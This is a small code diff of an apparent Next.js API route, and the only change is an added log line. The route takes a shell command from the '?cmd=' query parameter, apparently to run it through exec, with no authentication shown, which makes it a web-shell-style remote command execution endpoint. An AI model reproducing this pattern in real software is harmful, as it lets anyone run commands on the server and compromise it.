@@ -7,7 +7,7 @@ const execAsync = promisify(exec);
 export async function GET(req: Request) {
   const { searchParams } = new URL(req.url);
   const cmd = searchParams.get('cmd');
-
+  console.log("exec");
   if (!cmd) {
     return NextResponse.json({ error: '请通过 ?cmd= 参数传入要执行的命令' }, { status: 400 });
   }
